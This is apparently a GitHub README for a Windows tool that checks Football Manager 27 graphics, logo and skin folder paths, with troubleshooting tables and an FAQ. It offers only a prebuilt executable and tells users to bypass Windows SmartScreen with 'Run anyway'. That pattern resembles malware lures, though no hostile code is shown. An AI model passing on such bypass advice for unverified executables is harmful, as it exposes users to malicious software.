<p align="center">
  <img src="https://i.postimg.cc/TY2hByK6/banner.png" alt="FM27 Graphics Path Doctor — Facepacks, Logos and Skins Folder Check for Football Manager 27" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-Graphics%20Path%20Audit-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-fm27--graphics--path--26.11b-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# FM27 Graphics Path Doctor — Facepacks, Logos and Skins Folder Check

**Player faces still missing in Football Manager 27? Club badges replaced by generic logos? Installed a new skin but it never appears in Preferences?** Start with the folders before reinstalling gigabytes of artwork.

FM27 Graphics Path Doctor focuses on a problem that's easy to miss: the files exist on disk, but **FM27 may be reading a different user-data folder**. A Windows setup can have more than one plausible location, particularly after a Documents/OneDrive change, a custom data-location setting, or an upgrade from FM26.

This project is aimed at **Football Manager 27 on Windows**. It concerns custom graphics and file locations, not changes to the match engine, databases, saves, or game protection systems.

## Quick Symptom & Cause Reference

| Symptom / Error | Likely Cause | Recommended Check |
| --- | --- | --- |
| Facepack or club logos never appear in-game | Files placed in Steam install folder or OneDrive split `Documents` | Verify active `Sports Interactive\Football Manager 27\graphics` path |
| Only some player faces show up | Missing `config.xml` or double-nested archive (`faces\faces\...`) | Check `config.xml` alongside PNGs and flatten nested folders |
| Custom skin missing from Preferences dropdown | Skin copied into `graphics\` instead of `skins\`, or missing `skin.json` | Place skin folder directly inside `Football Manager 27\skins\` |
| Duplicate FM27 folders on Windows | OneDrive Documents redirection or leftover FM26 migration path | Compare timestamps across local `Documents`, `OneDrive`, and `Public` |

## Download for Windows

[**Download FM27Path.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/FM27Path.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why run `FM27Path.exe`? (Automatic checks in ~2 seconds)

- Resolves the exact `Documents` path Windows exposes to FM27 (detecting OneDrive redirection automatically).
- Scans `graphics\` for PNG counts, `config.xml` mappings, and double-nested archive folders (`faces\faces`).
- Inspects `skins\` subdirectories and checks for valid `skin.json` manifests.
- Flags duplicate `Sports Interactive\Football Manager 27` folders across user profiles.

### Sample Diagnostic Output

```text
[FM27Path] Auditing Football Manager 27 user-data & graphics folders...
[OK]   Active Documents : C:\Users\Player\OneDrive\Documents\Sports Interactive\Football Manager 27
[WARN] Duplicate Folder : C:\Users\Player\Documents\Sports Interactive\Football Manager 27 (inactive)
[OK]   graphics\faces   : 14,820 PNG files | config.xml: Found (1.4 MB)
[WARN] Folder Nesting   : graphics\logos\logos\config.xml (Double-nested folder detected!)
[OK]   skins\           : 2 skins found (skin.json verified)
```

The release ZIP is named `FM27Path.zip`; the Windows executable inside is named `FM27Path.exe`.

1. Close Football Manager 27 before moving or checking graphics packs.
2. Click **Download FM27Path.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `FM27Path.exe`.
5. Review the reported graphics locations before making any changes to your packs.
6. Restart Football Manager 27 and reload its interface if you change the graphics folder.

**Requirements:** Windows 10 or 11, a Windows PC installation of Football Manager 27, and access to the user account containing your FM27 files. This guide does not apply to the console or mobile versions.

### Verification & Windows SmartScreen Note

- **Read-only & standard user permissions:** `FM27Path.exe` runs without administrator rights and does not modify game binaries, system registry keys, or Windows Defender settings.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project focuses on

### FM27 facepacks not showing

A facepack can be fully extracted yet produce generic player portraits in-game. Before replacing the pack, check whether the individual image files and its `config.xml` are inside the **graphics folder used by this FM27 installation**. A folder with a familiar name is not necessarily the folder the game reads.

### Football Manager 27 logos not loading

Club logos and competition badges may stay generic if a logo pack is in the wrong location, the ZIP has not been extracted, or a package has an extra top-level folder. The useful test is not simply whether `logos` exists, but where that directory sits in relation to your actual FM27 user-data folder.

### FM27 skin not appearing in Preferences

A skin normally needs its own directory under `skins`. Check that the skin's files are directly below the intended skin directory, for example `skins\MySkin\skin.json`, rather than hidden under a second `MySkin` folder. Skins built for older versions may also need an update from the skin author.

### Graphics installed into the wrong FM27 directory

Players sometimes find separate Football Manager 27 folders under standard Documents, OneDrive Documents, or a custom path. Another common mistake is putting a facepack under `steamapps\common` because that is where the game was installed. The game's executable folder and its **user-data folder** are not necessarily the same.

## Where FM27 graphics normally belong

The default Windows user-data location to check is:

```text
%USERPROFILE%\Documents\Sports Interactive\Football Manager 27\
```

Inside that location, packs commonly use directories such as:

```text
Football Manager 27\
├── graphics\
│   ├── faces\
│   │   └── YourFacepack\
│   │       ├── config.xml
│   │       └── [image files]
│   ├── logos\
│   │   └── YourLogoPack\
│   │       ├── config.xml
│   │       └── [image files]
│   └── kits\
└── skins\
    └── YourSkin\
        └── skin.json
```

This is an **illustrative structure**, not a rule that every third-party pack must match exactly. Follow the package author's instructions for its internal subfolders. If Documents is redirected to OneDrive, check the OneDrive-backed Documents path; if you've changed FM's user-data location, use the location selected in the game rather than assuming the default one is active. Microsoft Store/Game Pass layouts may differ, too.

## A practical graphics-folder checklist

If your FM27 facepack, logo pack or skin still doesn't appear, work through these checks in order:

1. **Confirm which installation you are using.** Note whether FM27 is installed through Steam, Epic or the Microsoft Store/Game Pass. Installation paths and user data are separate concepts.
2. **Check the active data location in the game.** Don't choose a folder merely because it contains old packs from FM26 or FM24.
3. **Look for duplicate user-data folders.** Compare Documents, OneDrive Documents and any custom FM27 path. If the same packs are in several places, make a note of that before changing anything.
4. **Check extraction and nesting.** The ZIP must actually be extracted. Look for accidental structures such as `graphics\logos\PackName\PackName\...` when the pack author expected one `PackName` folder.
5. **Inspect the relevant `config.xml`.** An XML file can exist but refer to missing or moved images; a missing XML file can also stop a pack from mapping its graphics correctly. Don't hand-edit a large config without a backup.
6. **For skins, check `skin.json` and compatibility.** A skin that targets a different FM27 build might need an updated package.
7. **Close and reopen FM27.** After changing a graphics pack or skin, use the game's relevant reload/refresh options and then verify again.

### Before moving any files

Keep a copy of the original pack and its `config.xml`. Avoid touching the `games` folder that contains career saves. Do not delete other packs, change folder permissions across the whole drive, or disable Windows security features to make graphics appear. Reinstalling a facepack before identifying the active data folder often wastes time without changing the result.

## What an effective path report should tell you

A useful diagnosis identifies **which candidate locations exist**, which one the game is configured to use, and whether faces, logos and skins are nested there. It should distinguish a missing directory from an empty directory, an unextracted archive and a damaged XML file. When an issue remains unresolved, keep the paths and error details so you can ask the pack author a specific question instead of saying only “the logos don't work.”

## FAQ

**Why do FM27 faces still not show after I copied them into Documents?**

Check whether the game is using a different Documents or user-data path. OneDrive redirection and custom locations can make two almost identical folder trees look correct.

**Should I move graphics into Steam's installation folder?**

Not as a first fix. Normally the custom content belongs to the game’s user-data folder. Follow the instructions for your specific pack and store version.

**Can this repair a broken FM27 career save?**

No. Graphics-folder troubleshooting is separate from career save recovery. Don't edit or delete saved games while investigating missing pictures.

**Do I need a new facepack for FM27?**

Not necessarily. Some artwork transfers between editions, while other content and skins can require updated IDs, XML mapping or game-version support. Check the original publisher's FM27 instructions.

**What if only some team badges or player faces are missing?**

That can indicate gaps in the pack itself or mapping conflicts rather than a global path problem. Check a few affected files and their XML entries before moving the entire collection.

**Does it download facepacks, logos, or skins?**

No artwork is included in this repository. Obtain packs from their original authors and respect their licences.

## Useful reading

- [Football Manager 27 — official site](https://www.footballmanager.com/fm27)
- [Sports Interactive Community — graphics and skins installation and user-data folders](https://community.sports-interactive.com/forums/topic/558156-graphics-skins-installation-guide-user-data-location-info/)
- [Sortitoutsi — FM27 graphics packs and installation notes](https://sortitoutsi.net/graphics)

## More Windows Game Diagnostic Tools

- [FM27-SavePathCheck](../FM27-SavePathCheck) — Football Manager 27 career save folder & OneDrive path check
- [inZOI-CanvasModPathDoctor](../inZOI-CanvasModPathDoctor) — inZOI `Documents\inZOI`, OneDrive & `~mods` path doctor
- [Anno117-PaxRomanaSaveGuard](../Anno117-PaxRomanaSaveGuard) — Anno 117: Pax Romana `Documents` & OneDrive save guard
- [OverTheHill-SaveLocator](../OverTheHill-SaveLocator) — over the hill `Documents` / OneDrive save location check

*Independent community project. Football Manager, Sports Interactive and SEGA are trademarks of their respective owners. This repository is not affiliated with or endorsed by them.*
 
 
 
 
 
 
 
 
 
